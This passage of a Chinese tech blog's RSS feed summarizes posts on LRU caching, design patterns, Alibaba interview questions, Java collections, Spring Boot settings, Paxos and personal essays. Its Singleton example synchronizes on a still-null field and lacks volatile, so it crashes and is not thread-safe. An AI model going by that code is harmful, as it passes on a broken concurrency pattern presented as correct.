      <description>常见算法: LRU LRU-K 2Q MQ
缓存淘汰算法
缓存分析三大要点： 命中率、复杂度、代价 LRU 最近最少使用算法 FIFO 先入先出算法 MRU 最近最常使用算法 FIFO 先进先出 LFU 最少使用算法 LFU（Least Frequently Used）最近最少使用算法。 它是基于“如果一个数据在最近一段时间内使用次数很少，那么在将来一段时间内被使用的可能性也很小”的思路。 LRU LRU全称是Least Recently Used，即最近最久未使用的意思 注意LFU和LRU算法的不同之处，LRU的淘汰规则是基于访问时间，而LFU是基于访问次数的。   /** * Created by huoyan403 on 2017/8/16. * * 这个类也被Tomcat所使用（ org.apache.tomcat.util.collections.LRUCache），但是在tomcat6.x版本中，已经被弃用，使用另外其他的缓存类来替代它。 */ public class LRUCache { private int cacheSize; private Hashtable nodes;//缓存容器 private int currentSize; private CacheNode first;//链表头 private CacheNode last;//链表尾 /** * 链表节点 * @author Administrator * */ class CacheNode { CacheNode prev;//前一节点 CacheNode next;//后一节点 Object value;//值 Object key;//键 CacheNode() { } } public LRUCache(int i) { currentSize = 0; cacheSize = i; nodes = new Hashtable(i);//缓存容器 } /** * 获取缓存中对象 * @param key * @return */ public Object get(Object key) { CacheNode node = (CacheNode) nodes.</description>
    </item>
    
    <item>
      <title>设计模式-创建型</title>
      <link>https://www.wuxinvip.com/blog/design-pattern/establish/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/design-pattern/establish/</guid>
      <description>设计模式创建型&amp;ndash;5种
单例&amp;mdash;-创建线程安全类
工厂&amp;mdash;-创建bean工厂
抽象工厂&amp;mdash;-创建bean工厂的工厂
原型&amp;mdash;-clone模式 &amp;mdash;用于数据流转中对象快速复制
建造者&amp;mdash;创建bean类型多样组合-创建方式不变-依靠算法实现不同组合创建bean
单例
/** * Created by huoyan403 on 2017/8/14. */ public class Singleton { //防止被引用 赋值为null 目的实现延迟加载 private static Singleton singleton = null; //私有化构造方法 private Singleton() { } //静态工程方法 创建实例 public static Singleton getSingleton(){ if(singleton == null){ //synchronized关键字锁住的是这个对象，这样的用法，在性能上会有所下降，因为每次调用getInstance()， // 都要对对象上锁，事实上，只有在第一次创建对象的时候需要加锁，之后就不需要了 synchronized (singleton){ if(singleton == null) { singleton = new Singleton(); } } } return singleton; } //如果该对象被用于序列化 可以保证在序列化前后保持一致 public Object readResolve(){ return singleton; } }  工厂</description>
    </item>
    
    <item>
      <title>设计模式-结构型</title>
      <link>https://www.wuxinvip.com/blog/design-pattern/structure/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/design-pattern/structure/</guid>
      <description>设计模式-结构型&amp;ndash;7种
组合、适配器、过滤器、桥接、装饰、外观、享元、代理
组合&amp;ndash;最为常用&amp;ndash;将对象组合成一个树状结构、例如菜单上做自循环
适配器&amp;ndash;播放器格式适配&amp;ndash;对类型判定使用不同子类方法实例
桥接&amp;ndash;封装类组合形成一个复杂对象&amp;ndash;把复杂对象拆分简单对象
过滤器&amp;ndash;使用不同标准来过滤一组对象
装饰&amp;ndash;不增加子类-扩展类属性
外观&amp;ndash;外部定义一个高层接口-直接使用其属性
享元&amp;mdash;不太了解
代理&amp;ndash;使用一个类来代理另一个类来执行业务逻辑&amp;ndash;简单来讲-classB代理classA、classB来处理业务逻辑</description>
    </item>
    
    <item>
      <title>设计模式-行为型</title>
      <link>https://www.wuxinvip.com/blog/design-pattern/behavior/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/design-pattern/behavior/</guid>
      <description>设计模式行为型&amp;ndash;11种
责任链&amp;mdash;-请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。
命令&amp;mdash;-请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。
解释器&amp;mdash;-这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。
迭代器&amp;mdash;-这种模式用于顺序访问集合对象的元素，不需要知道集合对象的底层表示。
中介者&amp;mdash;-这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。
备忘录&amp;mdash;-保存一个对象的某个状态，以便在适当的时候恢复对象。备忘录模式属于行为型模式。
观察者&amp;mdash;-当对象间存在一对多关系时，则使用观察者模式（Observer Pattern）。比如，当一个对象被修改时，则会自动通知它的依赖对象。
状态&amp;mdash;-我们创建表示各种状态的对象和一个行为随着状态对象改变而改变的 context 对象。
空对象&amp;mdash;-在空对象模式（Null Object Pattern）中，一个空对象取代 NULL 对象实例的检查。Null 对象不是检查空值，而是反应一个不做任何动作的关系。 这样的 Null 对象也可以在数据不可用的时候提供默认的行为。
策略 * 在策略模式（Strategy Pattern）中，一个类的行为或其算法可以在运行时更改。这种类型的设计模式属于行为型模式。
 在策略模式中，我们创建表示各种策略的对象和一个行为随着策略对象改变而改变的 context 对象。策略对象改变 context 对象的执行算法。  模板
 在模板模式（Template Pattern）中，一个抽象类公开定义了执行它的方法的方式/模板。 它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行。这种类型的设计模式属于行为型模式。  访问
 在访问者模式（Visitor Pattern）中，我们使用了一个访问者类，它改变了元素类的执行算法。 通过这种方式，元素的执行算法可以随着访问者改变而改变。这种类型的设计模式属于行为型模式。 根据模式，元素对象已接受访问者对象，这样访问者对象就可以处理元素对象上的操作。  </description>
    </item>
    
    <item>
      <title>阿里电面总结</title>
      <link>https://www.wuxinvip.com/blog/essay/%E9%98%BF%E9%87%8C%E7%94%B5%E9%9D%A2%E6%80%BB%E7%BB%93/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/%E9%98%BF%E9%87%8C%E7%94%B5%E9%9D%A2%E6%80%BB%E7%BB%93/</guid>
      <description>先说问到的东西
负载均衡 DNS LVS Nginx 常用的 原理 路由转发
数据库:分库分表.底层
dubbo 注册原理 dubbo与springcloud 区别
java常用工具包
conllection底层 IO 底层 多线程技术 executoService
shell 查看网络连接 查看系统版本 从文件中找到最大数
算法:排序.负载均衡算法.缓存淘汰算法
python vb脚本 渗透. 加分项 ps:能说明你对技术感兴趣
反正大公司就是各种底层.原理.机制等等
说下我对java的理解
concurrentHashMap 锁结构
是否能重入
spring aop
spring事务 传播性 等等
分布式事务一致性
ThreadPool
就像开车一样.每个技术都是别人发明的.用规章制度才能更好的驾驭别人开发出来的武器. 不要怀疑别人为什么那么写(至少你还不够那个资格). 不要问为什么这么写.应该问别人为什么会这么做(是不是开起车来.更快更稳).还是那句话.
还有底层.我一个小二本.没本事入大公司法眼.自然也就不会&amp;rsquo;更&amp;rsquo;关注底层.先了解了架构.数据流向.
你至少应该明白你做的系统是个什么东西.你做的是那一块.需要什么样的性能
在这个基础上.有些人会不再钻研技术.走向管理岗位.这也是很多管理广而不细.
还有一些人开始了技术底层之路.也就是资深人士.
现在进不去没关系.以后我会的.</description>
    </item>
    
    <item>
      <title>阿里证书</title>
      <link>https://www.wuxinvip.com/blog/technical-summary/technical-summary-100/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/technical-summary/technical-summary-100/</guid>
      <description>** 阿里编码规范 ** ** 阿里API服务调用 ** ** 阿里网站部署 **
** 阿里mysql **</description>
    </item>
    
    <item>
      <title>阿里面霸总结的面试题</title>
      <link>https://www.wuxinvip.com/blog/essay/%E9%98%BF%E9%87%8C%E9%9D%A2%E9%9C%B8%E6%80%BB%E7%BB%93%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/%E9%98%BF%E9%87%8C%E9%9D%A2%E9%9C%B8%E6%80%BB%E7%BB%93%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98/</guid>
      <description>（1）自我介绍，做过什么项目。 （2）java虚拟机的区域如何划分，每一个区的动能，这一块自由发挥。 （3）双亲委派模型中，从顶层到底层，都是哪些类加载器，分别加载哪些类？ （4）有没有可能父类加载器和子类加载器，加载同一个类？如果加载同一个类，该使用哪一个类？ （5）HashMap的结构，get()，put()是如何实现的？HashMap有哪些问题？ （6）ConcurrentHashMap的get()，put()，又是如何实现的？ConcurrentHashMap有哪些问题？ ConcurrentHashMap的锁是读锁还是写锁？ （7） HashMap与HashTable的区别 （8）sleep()和wait()分别是哪个类的方法，有什么区别？synchronized底层如何实现的？用在代码块和方法上有什么区别？ （9）什么是线程池？如果让你设计一个动态大小的线程池，如何设计，应该有哪些方法？ （10）什么是死锁？JVM线程死锁，你该如何判断是因为什么？如果用VisualVM，dump线程信息出来，会有哪些信息？这一块问的很多....问的我懵了. 因为并没有实际操作过 = = （11）查看jvm虚拟机里面堆、线程的信息，你用过什么命令？我只用过图形界面VisualVM。。。 （12）垃圾回收算法有哪些？CMS知道吗？如何工作的？ （13）数据库中什么是事务？事务的隔离级别？事务的四个特性？什么是脏读，幻读，不可重复读？ （14）数据库索引的结构有哪些？我说B树和B+树，他说只有这两个吗。我又说全文倒排索引。然后介绍B+树的结构。 （15）数据库中的分页查询语句怎么写？ （16）什么是一致性哈希？用来解决什么问题？ （17）Redis的存储结构，或者说如何工作的，与mysql的区别？有哪些数据类型？ （18）项目中用到redis，为什么选用redis，了解其他NoSQL数据库吗？在你的项目中是如何运用redis的？key是什么，value是什么？ （19）归并排序的过程？时间复杂度？空间复杂度？ （20）你平常用什么排序？快速排序。说说在那些场景下适用，哪些场景下不适用。 （21）你在项目中做什么？因为我用到Solr，他就问我Solr是如何工作的？  （1）自我介绍。 （2）JVM如何加载一个类的过程，双亲委派模型中有哪些方法？ （3）HashMap如何实现的？ （4）HashMap和Concurrent HashMap区别， Concurrent HashMap 线程安全吗， Concurrent HashMap如何保证 线程安全？ （5）HashMap和HashTable 区别，HashTable线程安全吗？ （6）进程间通信有哪几种方式？ （7）JVM分为哪些区，每一个区干吗的？ （8）JVM如何GC，新生代，老年代，持久代，都存储哪些东西？ （9）GC用的引用可达性分析算法中，哪些对象可作为GC Roots对象？ （10）快速排序，过程，复杂度？ （11）什么是二叉平衡树，如何插入节点，删除节点，说出关键步骤。 （12）TCP如何保证可靠传输？三次握手过程？ （13）TCP和UDP区别？ （14）滑动窗口算法？ （15）Linux下如何进行进程调度的？ （16）Linux下你常用的命令有哪些？ （17）操作系统什么情况下会死锁？ （18）常用的hash算法有哪些？ （19）什么是一致性哈希？ （20）如何理解分布式锁？ （21）数据库中的范式有哪些？ （22）数据库中的索引的结构？什么情况下适合建索引？ （23）Java中的NIO，BIO，AIO分别是什么？ （24）用什么工具调试程序？JConsole，用过吗？ （25）现在JVM中有一个线程挂起了，如何用工具查出原因？ （26）线程同步与阻塞的关系？同步一定阻塞吗？阻塞一定同步吗？ （27）同步和异步有什么区别？ （28）线程池用过吗？ （29）如何创建单例模式？说了双重检查，他说不是线程安全的。如何高效的创建一个线程安全的单例？ （30）concurrent包下面，都用过什么？ （31）常用的数据库有哪些？redis用过吗？ （32）了解hadoop吗？说说hadoop的组件有哪些？hdfs，hive,hbase,zookeeper。说下mapreduce编程模型。 （33）你知道的开源协议有哪些？ （34）你知道的开源软件有哪些？ （35）你最近在看的书有哪些？ （36）你有什么问题要问我吗？ （37）了解哪些设计模式？说说都用过哪些设计模式 （38）如何判断一个单链表是否有环？ （39）操作系统如何进行分页调度？ （40）匿名内部类是什么？如何访问在其外面定义的变量？  HashMap和Hashtable的区别 实现一个保证迭代顺序的HashMap 说一说排序算法，稳定性，复杂度 说一说GC 可以保证的实习时长 职业规划  </description>
    </item>
    
    <item>
      <title>集合Map</title>
      <link>https://www.wuxinvip.com/blog/jdk/jdk-map/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/jdk/jdk-map/</guid>
      <description>Java Map 集合类简介
【关键点】map的hash冲突
Map 处理这些冲突的方法是在索引位置处插入一个链接列表，并简单地将元素添加到此链接列表
public Object put(Object key, Object value) { //我们的内部数组是一个 Entry 对象数组 //Entry[] table; //获取哈希码，并映射到一个索引 int hash = key.hashCode(); int index = (hash &amp;amp; 0x7FFFFFFF) % table.length; //循环遍历位于 table[index] 处的链接列表，以查明 //我们是否拥有此键项 — 如果拥有，则覆盖它 for (Entry e = table[index] ; e != null ; e = e.next) { //必须检查键是否相等，原因是不同的键对象 //可能拥有相同的哈希 if ((e.hash == hash) &amp;amp;&amp;amp; e.key.equals(key)) { //这是相同键，覆盖该值 //并从该方法返回 old 值 Object old = e.value; e.value = value; return old; } } //仍然在此处，因此它是一个新键，只需添加一个新 Entry //Entry 对象包含 key 对象、 value 对象、一个整型的 hash、 //和一个指向列表中的下一个 Entry 的 next Entry //创建一个指向上一个列表开头的新 Entry， //并将此新 Entry 插入表中 Entry e = new Entry(hash, key, value, table[index]); table[index] = e; return null; }  </description>
    </item>
    
    <item>
      <title>集合Set</title>
      <link>https://www.wuxinvip.com/blog/jdk/jdk-set/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/jdk/jdk-set/</guid>
      <description>结合set 底层实现方式是map 算是一次封装使用 既保证数据只能存放单个数据 又使用到了map的特性 hash 链表结构
关键点 把value 作为key 存放到map中 而value值 则存放了一个 空object // Dummy value to associate with an Object in the backing Map private static final Object PRESENT = new Object();
那么这么做 就使set 拥有了不同于 map的特性
比如 treemap 可重复 可排序 就变成了 不可重复但是 由于链表形式 可排序
hashSet 与 hashMap 一样都是无序
linkedHashSet 与 linkedHashMap 一样 保证插入顺序 与输出顺序一致
treeSet 和 treeMap 默认 取key的hash值以升序排列数据</description>
    </item>
    
    <item>
      <title>风控系统</title>
      <link>https://www.wuxinvip.com/blog/service-design/design-5/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-design/design-5/</guid>
      <description></description>
    </item>
    
    <item>
      <title>高并发</title>
      <link>https://www.wuxinvip.com/blog/technical-summary/technical-summary-4/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/technical-summary/technical-summary-4/</guid>
      <description>分布式，服务SOA，集群
建个好的表结构，降低业余逻辑代码量，因为多一行代码，多一份危险，简单到极致的增删改最最能抗住高并发的
申明:spring cloud 1.0 就经过了千万级别用户洗礼才发布的</description>
    </item>
    
    <item>
      <title>springboot 配置 内嵌 tomcat</title>
      <link>https://www.wuxinvip.com/blog/spring-boot/springboot-tomcat/</link>
      <pubDate>Sat, 24 Feb 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-boot/springboot-tomcat/</guid>
      <description>#启动端口 server. Port = xxxx #绑定ip server. Address = #容器 uri server. contextPath = #部署name server. displayName = #servlet 路径 server. servletPath = #容器参数 server. contextParameters = #转发header server. useForwardHeaders = #服务header server. serverHeader = #最大 header大小 server. maxHttpHeaderSize = #最大 post 数据大小 server. maxHttpPostSize = #连接超时时间 server. connectionTimeout = #session 失效时间 server. session.timeout = #模块跟踪 server. session.trackingModes = server. session.persistent = #数据缓存目录【常见上传图片】 server.session.storeDir = #cookie 名字 server.cookie. name = #域服务名字 server.</description>
    </item>
    
    <item>
      <title>在线随机密码生成工具</title>
      <link>https://www.wuxinvip.com/blog/encryption/password-created/</link>
      <pubDate>Thu, 13 Jul 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/encryption/password-created/</guid>
      <description> 本站保证不收集任何生成密码、且全站使用https加密、请放心使用生成的密码   密码位数： （建议设置在10-50之间）
 大写字母　小写字母　数字　特殊字符
 生成密码    觉得不错就收藏下喽~~ </description>
    </item>
    
    <item>
      <title>paxos【转】</title>
      <link>https://www.wuxinvip.com/blog/algorithm/paxos/</link>
      <pubDate>Sat, 08 Jul 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/algorithm/paxos/</guid>
      <description>wiki-paxos
zk 原理 watcher 监听
paxos 转载地址：http://www.cnblogs.com/endsock/p/3480093.html
在paxos算法中，分为4种角色： Proposer ：提议者 Acceptor：决策者 Client：产生议题者 Learner：最终决策学习者 上面4种角色中，提议者和决策者是很重要的，其他的2个角色在整个算法中应该算做打酱油的， Proposer就像Client的使者，由Proposer使者拿着Client的议题去向Acceptor提议，让Acceptor来决策。 这里上面出现了个新名词：最终决策。现在来系统的介绍一下paxos算法中所有的行为： 1、Proposer提出议题 2、Acceptor初步接受 或者 Acceptor初步不接受 3、如果上一步Acceptor初步接受则Proposer再次向Acceptor确认是否最终接受 4、Acceptor 最终接受 或者Acceptor 最终不接受 5、上面Learner最终学习的目标是Acceptor们最终接受了什么议题？注意，这里是向所有Acceptor学习， 6、如果有多数派个Acceptor最终接受了某提议，那就得到了最终的结果，算法的目的就达到了。 画一幅图来更加直观：     为什么需要3个Acceptor？因为Acceptor必须是最少大于等于3个，并且必须是奇数个， 因为要形成多数派嘛，如果是偶数个，比如4个，2个接受2个不接受，各执己见，没法搞下去了。 为什么是3个Proposer？ 其实无所谓是多少个了，1~n 都可以的；如果是1个proposer，毫无竞争压力，很顺利的完成2阶段提交， Acceptor们最终批准了事。如果是多个proposer就比较复杂了，请继续看。 上面的图中是画了很多节点的，每个节点需要一台机器么？答案是不需要的，上面的图是逻辑图， 物理中，可以将Acceptor和Proposer以及Client放到一台机器上，只是使用了不同的端口号罢了， Acceptor们启动不同端口的TCP监听，Proposer来主动连接即可； 完全可以将Client、Proposer、Acceptor、Learner合并到一个程序里面； 这里举一个例子： 比如开发一个JOB程序，JOB程序部署在多台服务器上(数量为奇数)，这些JOB有可能同时处理一项任务， 现在使用paxos算法让这些JOB自己来商量由谁(哪台机器)来处理这项任务，这样JOB程序里就需要包含Client、 Proposer、Acceptor、Learner这4大功能，并且需要配置其他JOB服务器的IP地址。 再举一个例子，zookeeper常常用来做分布式事务锁。Zookeeper所使用的zad协议也是类似paxos协议的。 所有分布式自协商一致性算法都是paxos算法的简化或者变种。 Client是使用zookeeper服务的机器，Zookeeper自身包含了Acceptor, Proposer, Learner。 Zookeeper领导选举就是paxos过程，还有Client对Zookeeper写Znode时，也是要进行Paxos过程的， 因为不同Client可能连接不同的Zookeeper服务器来写Znode，到底哪个Client才能写成功？ 需要依靠Zookeeper的paxos保证一致性，写成功Znode的Client自然就是被最终接受了， Znode包含了写入Client的IP与端口，其他的Client也可以读取到这个Znode来进行Learner。 也就是说在Zookeeper自身包含了Learner(因为Zookeeper为了保证自身的一致性而会进行领导选举， 所以需要有Learner的内部机制，多个Zookeeper服务器之间需要知道现在谁是领导了)， Client端也可以Learner，Learner是广义的。 现在通过一则故事来学习paxos的算法的流程(2阶段提交)，有2个Client(老板，老板之间是竞争关系)和3个Acceptor(政府官员)： 现在需要对一项议题来进行paxos过程，议题是“A项目我要中标！”，这里的“我”指每个带着他的秘书Proposer的Client老板。 Proposer当然听老板的话了，赶紧带着议题和现金去找Acceptor政府官员。 作为政府官员，当然想谁给的钱多就把项目给谁。 Proposer-1小姐带着现金同时找到了Acceptor-1~Acceptor-3官员，1与2号官员分别收取了10比特币，找到第3号官员时， 没想到遭到了3号官员的鄙视，3号官员告诉她，Proposer-2给了11比特币。 不过没关系，Proposer-1已经得到了1,2两个官员的认可，形成了多数派(如果没有形成多数派， Proposer-1会去银行提款在来找官员们给每人20比特币，这个过程一直重复每次+10比特币，直到多数派的形成)， 满意的找老板复命去了，但是此时Proposer-2保镖找到了1,2号官员，分别给了他们11比特币， 1,2号官员的态度立刻转变，都说Proposer-2的老板懂事，这下子Proposer-2放心了，搞定了3个官员， 找老板复命去了，当然这个过程是第一阶段提交，只是官员们初步接受贿赂而已。 故事中的比特币是编号，议题是value。 这个过程保证了在某一时刻，某一个proposer的议题会形成一个多数派进行初步支持； ===============华丽的分割线，第一阶段结束================ 5.</description>
    </item>
    
    <item>
      <title>随便写点</title>
      <link>https://www.wuxinvip.com/blog/essay/essay-1/</link>
      <pubDate>Thu, 06 Jul 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/essay-1/</guid>
      <description>做人、莫为了钱背信弃义 做事、一定要有自己的判断 感情、去了就去了、别纠缠不清 过往、平淡如水  人这一辈子、总会有许多错误、 在你迷茫不知前路的年纪、总会犯下许许多多的错误、 当你的人生回归正道的时候、也需要为你犯下的错误而偿还代价 错过的人、错过的事、错误的选择、 弯路也是路、认清现在的自己、看清楚未来的自己、才会丢掉迷失的自己、不后悔、 我不能改变我以前做的错事、但可以以此为鉴、在今后的生活中、选择正确的、 谁的人生没有痛苦、想想这些、就算了吧、会更好的、一切都会更好的  引子
 山不在高、有仙则灵 水不在深、有龙则灵 世事无相、相由心生 可见之物、实为非物 可感之事、实为非事 物事皆空、空为心瘴 俗人之心、处处皆狱 唯有化世、堪为无我 我即为世、世即为我  道可道.非常道.名可名.非常名
人生就像一壶酒。有苦有辣有辛酸。有梦有泪有遗憾。
没钱的人是苦涩的一生。有钱的人是短暂的一生。
有时候越想没有遗憾，遗憾越多。
人生郁郁不得意的时候，往往回忆最美。
别跟你女朋友讲多喝点热水，请认真的去关爱这个能陪伴你一生的人。
人的一生，二十岁往后就会失陷，名.利.权. 请多花点心思在爱你的人身上，别在最后的时间里，遗憾一生。
别累垮了自己，什么情况下请关心自己，大家都会理解。
每个百毒不侵的人，都曾被深深的伤害过。
当心爱的人离开，你才明白没有人能陪你走到永远。
当时间消磨掉了你的热情，你便会发现，那些曾令你歇斯底里的去执著的人，现已变得可有可无。
描述卡耐基的一段话
 我从未看到过有人像他这般富有想象力、无穷的智慧以及透彻的理解力、 他能读懂你的思想，并把你的一切行为和思想都储存到他的脑海中、 你尚未开口，他似乎已经知道你要说什么， 他思维敏捷，而且他还有一种深入观察的习惯，这使得他能了解每一件事。 但他最杰出的天赋才能是具有激烈他人的能力、他身上总散发着一种自信。 若你对某些事情有些疑惑，可以可卡耐基先生讨论，他会立刻使你明白你自己的想法是正确的 并使你绝对相信你自己的想法，甚至他也会指出其中的弱点，从而消除你的疑惑、 这种吸引人、鼓舞人的个性来自于他的自信。 他的领导成就是有目共睹的。我想、在企业史上、除了他之外，再也难以找到一个像他这样的人、 对自己的企业细节一无所知、而且本人丝毫不懂钢铁或者工程技术、但却建立起了一个如此庞大的 企业王国。  题外箴言
能力就是有组织地努力、
这一能力包括你的教育程度、你的才智、你的承受力、你的性格、以及你的品格。</description>
    </item>
    
    <item>
      <title>AI 人机交互发展史</title>
      <link>https://www.wuxinvip.com/blog/ai/ai-001/</link>
      <pubDate>Tue, 04 Jul 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/ai/ai-001/</guid>
      <description>起源发展 人机交互发展历程
 PC时代
键盘+鼠标  移动互联网时代
多点触摸、手写、手势、siri语音交互 android ios  智能生活时代
  语音交互发展路径
 具备语音能力的app 实体语音按键 无需按键语音唤醒 远场全双工无需重复唤醒 【讯飞AIUI】 多模态交互机器人  语音交互痛点
 语音识别不准
环境嘈杂、离得远、方言口音 垂直领域术语、个性化词汇  语义理解不对
上下文关联、场景相关 实体取名复杂 垂直领域实体歧义 口语化、尝试北京、省略说法  信息内容不足
即时性 可用性 授权  系统响应单一
机器反馈方式缺少变化 缺少通用对话管理策略   机器翻译技术发展史
 基于规则的机器翻译 IBM提出的基于词的统计翻译模型 Koehn提出基于短语的统计翻译模型 谷歌和蒙特利尔大学提出端到端神经机器翻译 蒙特利尔大学引入Attention机制、解决场景翻译难点 谷歌发布 transformer系统  三大技术路线
 规则机器翻译
openLogos--开源、 三个技术路线：直接翻译、借助词典；句法树翻译、借助词典；中间语言来翻译 优点 保持原文结构 对于语言现象已知或者结构规范的源语言效果较好 缺点 人工编写、工作量大 主观性强、一致性难以保障 不利于系统扩充 无法解决不规范语言翻译  统计机器翻译</description>
    </item>
    
    <item>
      <title>DevOps 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-devops%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-devops%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 DevOps 图谱   </description>
    </item>
    
    <item>
      <title>IOS图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-ios%E6%8A%80%E8%83%BD/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-ios%E6%8A%80%E8%83%BD/</guid>
      <description>   收集到的 IOS 图谱   </description>
    </item>
    
    <item>
      <title>OpenResty 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-openresty%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-openresty%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 OpenResty 图谱   </description>
    </item>
    
    <item>
      <title>hadoop 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-hadoop/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-hadoop/</guid>
      <description>   收集到的 hadoop 图谱   </description>
    </item>
    
    <item>
      <title>java list 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-java-list/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-java-list/</guid>
      <description>   收集到的 java list 图谱   </description>
    </item>
    
    <item>
      <title>java map 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-java-map/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-java-map/</guid>
      <description>   收集到的 java map 图谱   </description>
    </item>
    
    <item>
      <title>java set 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-java-set/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-java-set/</guid>
      <description>   收集到的 java set 图谱   </description>
    </item>
    
    <item>
      <title>java 并发 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-java%E5%B9%B6%E5%8F%91%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-java%E5%B9%B6%E5%8F%91%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 java 并发 图谱   </description>
    </item>
    
    <item>
      <title>java 集合 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-java%E9%9B%86%E5%90%88%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-java%E9%9B%86%E5%90%88%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 java 集合 图谱     收集到的 java 集合 图谱   </description>
    </item>
    
    <item>
      <title>jvm 垃圾回收 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-jvm%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-jvm%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 jvm 垃圾回收 图谱   </description>
    </item>
    
    <item>
      <title>一致性图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E4%B8%80%E8%87%B4%E6%80%A7%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E4%B8%80%E8%87%B4%E6%80%A7%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 一致性 图谱   </description>
    </item>
    
    <item>
      <title>云计算 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E4%BA%91%E8%AE%A1%E7%AE%97/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E4%BA%91%E8%AE%A1%E7%AE%97/</guid>
      <description>   收集到的 云计算 图谱     收集到的 云计算 图谱   </description>
    </item>
    
    <item>
      <title>互联网大流量的方法图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E4%BA%92%E8%81%94%E7%BD%91%E5%A4%A7%E6%B5%81%E9%87%8F%E6%96%B9%E6%B3%95%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
